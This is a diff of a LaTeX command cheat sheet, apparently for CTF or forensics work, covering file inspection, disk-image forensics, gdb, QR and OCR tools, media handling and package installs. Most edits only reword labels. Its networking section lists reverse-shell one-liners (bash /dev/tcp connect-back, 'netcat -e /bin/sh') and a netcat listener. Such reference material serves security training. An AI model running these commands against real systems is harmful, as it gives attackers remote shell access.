@@ -36,11 +36,11 @@
 
 \begin{ldesc}
 	\li[Guess file type using magic]      \$ file \I{file}
-	\li[Printable strings in binary file] \$ strings \I{file}
+	\li[Printable strings in bin file]    \$ strings \I{file}
 	\li[Hexadecimal dump]                 \$ xxd [-c\I{16} -g\I{2}] \I{file} \li
 	                                      \$ hexdump \I{file} \li
 										  \$ od -tx1z \I{file}
-	\li[Binary hexadecimal editor]        \$ elvis [-c"display hex"] \I{file}
+	\li[Hexadecimal editor]               \$ elvis [-c"display hex"] \I{file}
 	\li[Extract JPEG EXIF data]           \$ exiv2 \I{img.jpeg} \li
 	                                      \$ jhead \I{img.jpeg}
 	\li[Extract PNG metadata]             \$ pngcheck -7ptv \I{img.png}
@@ -83,12 +83,12 @@
 
 
 \begin{ldesc}
-	\li[Mounting FS image]         \$ mount \I{fs.img} \I{mountpoint}
-	\li[~~(override user/group)]   ~~~-o uid=user,gid=users
-	\li[List orphan inodes on disk image]     \$ ils \I{fs.img}
-	\li[List deleted files on disk image]     \$ fls -drp \I{fs.img}
-	\li[Output file contents from inode no.]  \$ icat \I{fs.img} \I{1337}
-	\li[(Deleted) file contents on disk img.] \$ fcat \I{path/to/file} \I{fs.img}
+	\li[Mounting FS image]                \$ mount \I{fs.img} \I{mountpoint}
+	\li[~~(override user/group)]          ~~~-o uid=user,gid=users
+	\li[List orphan inodes on image]      \$ ils \I{fs.img}
+	\li[List deleted files on image]      \$ fls -drp \I{fs.img}
+	\li[File contents from inode number]     \$ icat \I{fs.img} \I{1337}
+	\li[(Deleted) file contents on image] \$ fcat \I{path/to/file} \I{fs.img}
 \end{ldesc}
 
 
@@ -118,7 +118,7 @@
 
 \begin{ldesc}
 	\li[simple / command line]     \$ gdb ./program
-	\li[run program]               > r [parameters] [< re > directs]
+	\li[run program]               > r [parameters] [< fin > fout]
 	\li[print backtrace]           > bt
 	\li[set breakpoint on \I{foo}] > b \I{foo}
 	\li[unset       breakpoint(s)] > delete breakpoint [no]
@@ -185,10 +185,12 @@
 	                      width height~~~~~~~~\textnormal{(in printable digits)} \li
 					      255~~~~~~~~~~~~~~~~~\textnormal{(max color)} \li
 					      RGBRGBRGBRGBRGB...  \textnormal{($\times$ \textit{width} $\times$ \textit{height})}
-	\li[Bar/qrcode scanner]   \$ zbarimg -{-}raw \I{image.png}
-	\li[Gen. qrcode for \I{word}] \$ qrencode \I{word} -o \I{image.png}
-	\li[~~(from X selection)] \$ import \I{i.png} \&\& zbarimg -{-}raw \I{i.png}
+	\li[QR code for \I{word}] \$ qrencode \I{word} -o \I{image.png}
+	\li[Scan QR/barcode]      \$ zbarimg -{-}raw \I{image.png}
+	\li[~(from X selection)]  \$ import \I{i.png} \&\& zbarimg -{-}raw \I{i.png}
 	\li[OCR in \I{lng} lang.] \$ tesseract [-l \I{lng}] \I{i.png} stdout
+\end{ldesc}\\[0pt]
+\begin{ldesc}
 	\li[Crop]                 \$ convert -crop \I{W}x\I{H}+\I{HP}+\I{VP} \I{i.png} \I{o.png}
 	\li[Montage/Concat]       \$ montage -mode concatenate \I{*.png} \I{o.png}
 %	\li[Simple unsteg]        ...  % TODO: simple unsteg
@@ -199,7 +201,7 @@
 
 \begin{ldesc}
 	\li[Extract Frames]  \$ ffmpeg -i \I{video.mp4} \I{frame-\%4d.jpeg}
-	\li[Downl. vid. (yt/etc)] \$ youtube-dl "\I{https://example.com/etc}"
+	\li[Dwn. vid. (yt/etc)] \$ youtube-dl "\I{https://example.com/etc}"
 \end{ldesc}
 
 
@@ -207,7 +209,7 @@
 
 \begin{ldesc}
 	\li[Graphical editor / waveform]   \$ audacity \I{audio.flac}
-	\li[Spectrogram]                   \$ sox \I{audio.flac} -n spectrogram
+	\li[Spectrogram]                   \$ sox \I{aud.flac} -n spectrogram
 	\li[Extract notes from MIDI]       \$ midi2ly \I{music.midi}
 	\li[Generate music sheet]          \$ lilypond \I{music.ly}
 \end{ldesc}
@@ -265,9 +267,9 @@
 
 \begin{ldesc}
 	\li[netcat listen] client\$ netcat -vlp 1337
-	\lI[Linux connect back]  \$ sh >\& /dev/tcp/client/1337 0>\&1
+	\lI[Linux connect-back]  \$ sh >\& /dev/tcp/client/1337 0>\&1
 	\li[\ \ (colored)]       \$ bash -i >\& /dev/tcp/client/1337 0>\&1
-	\li[Netcat connect back] \$ netcat -e /bin/sh localhost 1337
+	\li[Netcat connect-back] \$ netcat -e /bin/sh localhost 1337
 	\li[\ \ (colored)]       \$ nc -e "/bin/bash -i" localhost 1337
 \end{ldesc}
 
@@ -305,7 +307,7 @@
 
 \section{Number/character conversion}
 
-\begin{tabularlc}{lCCC}
+\begin{tabularlc}{@{}lCCC}
 \li              \textnormal{Ruby}   & \textnormal{Haskell}
 \li[lib]                             & import Data.Char
 %li[lib]                             & import Data.List
@@ -346,10 +348,10 @@
 	\li[Image metadata]    \$ pacman -S jhead exiv2 pngcheck
 	\li[QR/Barcode]        \$ pacman -S zbar qrencode
 	\li[Disk image]        \$ pacman -S sleuthkit libewf
-	\li[Networking (act.)] \$ pacman -S \{gnu,openbsd\}-netcat nmap
-	\li[Networking (psv.)] \$ pacman -S wireshark-\{cli,gtk\} tcpdump
+	\li[Network (act.)]    \$ pacman -S \{gnu,openbsd\}-netcat nmap
+	\li[Network (psv.)]    \$ pacman -S wireshark-\{cli,gtk\} tcpdump
 	\li[OCR]               \$ pacman -S tesseract tesseract-data-eng %\{,por,jpn}
-	\li[Encoding/Decoding] \$ pacman -S bsdgames
+	\li[En/Decoding]       \$ pacman -S bsdgames
 	\li[8086 emulator] \$ pacman -U fake86-???.pkg.tar.gz  \# AUR
 	\li[Dial Tones]        \$ pacman -S archassault/multimon-ng
 	\li[Android]           \$ pacman -S archassault/dex2jar
